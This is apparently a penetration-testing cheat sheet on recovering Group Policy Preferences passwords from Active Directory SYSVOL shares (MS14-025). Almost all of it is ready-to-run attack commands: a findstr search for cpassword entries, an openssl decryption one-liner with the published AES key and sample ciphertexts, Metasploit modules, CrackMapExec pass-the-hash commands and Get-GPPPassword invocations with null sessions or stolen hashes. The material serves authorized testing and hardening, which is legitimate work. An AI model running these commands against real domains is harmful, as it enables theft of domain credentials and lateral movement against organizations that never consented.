# SYSVOL & Group Policy Preferences

## **searching SYSVOL**

Find password in SYSVOL \(MS14-025\). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.

```text
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

## Decrypting GPP

Decrypt a Group Policy Password found in SYSVOL \(by [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280)\), using the 32-byte AES key provided by Microsoft in the [MSDN - 2.2.1.1.4 Password Encryption](https://msdn.microsoft.com/en-us/library/cc422924.aspx)

```text
echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

e.g: 
echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

## **Automate the SYSVOL and passwords research**

\*\*\*\*

#### **Metasploit** modules to enumerate shares and credentials

```text
scanner/smb/smb_enumshares
post/windows/gather/enum_shares
post/windows/gather/credentials/gpp
```

#### CrackMapExec modules

```text
cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
```

[Get-GPPPassword](https://github.com/ShutdownRepo/Get-GPPPassword)

```text
# with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash
Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```

\*\*\*\*

\*\*\*\*

\*\*\*\*

\*\*\*\*
